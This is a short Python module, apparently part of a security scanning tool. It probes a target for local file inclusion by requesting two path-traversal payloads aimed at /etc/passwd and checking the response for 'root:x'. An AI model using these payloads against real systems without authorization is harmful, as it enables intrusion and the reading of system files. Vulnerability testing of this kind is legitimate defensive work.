import requests
from config import HTTP_HEADERS, DEFAULT_TIMEOUT

class LFIScanner:
    def __init__(self):
        self.payloads = [
            "../../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd"
        ]

    def scan(self, target):
        results = []
        for payload in self.payloads:
            try:
                url = f"http://{target}/?file={payload}"
                response = requests.get(url, headers=HTTP_HEADERS, timeout=DEFAULT_TIMEOUT)
                if "root:x" in response.text:
                    results.append({"vulnerable": True, "payload": url})
            except Exception as e:
                results.append({"error": str(e)})
        return results if results else [{"vulnerable": False}]

def scan(args=None):
    return LFIScanner().scan(args.target)
